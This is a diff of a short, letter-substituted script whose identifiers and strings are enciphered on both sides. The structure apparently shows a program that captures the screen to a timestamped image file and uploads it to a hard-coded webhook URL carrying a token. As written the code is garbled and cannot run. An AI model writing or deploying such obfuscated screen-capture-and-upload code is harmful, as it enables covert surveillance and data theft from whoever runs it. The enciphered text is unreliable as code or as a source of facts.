@@ -1,26 +1,26 @@
-dhkjmo hnn
-dhkjmo odhz
-dhkjmo mzlpznon
+nrutwy rxx
+nrutwy ynrj
+nrutwy wjvzjxyx
 
-RZWCJJF_PMG = "cookn://ydnxjmy.xjh/vkd/rzwcjjfn/4626509924717614417/kx_V1NwBy40Q6L2VzTF3vNt4p0wPZZG2_0l_EZjta0uRGKTtcXxzo7Nltgmiryl8s4yz"
+BJGMTTP_ZWQ = "myyux://inxhtwi.htr/fun/bjgmttpx/8060943368151058851/uh_F5XgLi84A0V6FjDP7fXd8z4gZJJQ6_4v_OJtdk4eBQUDdmHhjy1Xvdqwsbiv2c8ij"
 
-yza ovfz_nxmzzincjo():
-    rdoc hnn.hnn() vn nxo:
-        adgzivhz = a"nxmzzincjo_{dio(odhz.odhz())}.kib"
-        nxo.ncjo(jpokpo=adgzivhz)
-    mzopmi adgzivhz
+ijk yfpj_xhwjjsxmty():
+    bnym rxx.rxx() fx xhy:
+        knqjsfrj = k"xhwjjsxmty_{nsy(ynrj.ynrj())}.usl"
+        xhy.xmty(tzyuzy=knqjsfrj)
+    wjyzws knqjsfrj
 
-yza nziy_oj_ydnxjmy(adgz_kvoc):
-    rdoc jkzi(adgz_kvoc, "mw") vn a:
-        adgzn = {
-            "adgz": (adgz_kvoc, a)
+ijk xjsi_yt_inxhtwi(knqj_ufym):
+    bnym tujs(knqj_ufym, "wg") fx k:
+        knqjx = {
+            "knqj": (knqj_ufym, k)
         }
-        mznkjinz = mzlpznon.kjno(RZWCJJF_PMG, adgzn=adgzn)
-    da mznkjinz.novopn_xjyz == 537:
-        kmdio("vggjr")
-    zgnz:
-        kmdio(a"avgnz: {mznkjinz.novopn_xjyz} {mznkjinz.ozso}")
+        wjxutsxj = wjvzjxyx.utxy(BJGMTTP_ZWQ, knqjx=knqjx)
+    nk wjxutsxj.xyfyzx_htij == 971:
+        uwnsy("fqqtb")
+    jqxj:
+        uwnsy(k"kfqxj: {wjxutsxj.xyfyzx_htij} {wjxutsxj.yjcy}")
 
-da __ivhz__ == "__hvdi__":
-    kvoc = ovfz_nxmzzincjo()
-    nziy_oj_ydnxjmy(kvoc)
+nk __sfrj__ == "__rfns__":
+    ufym = yfpj_xhwjjsxmty()
+    xjsi_yt_inxhtwi(ufym)
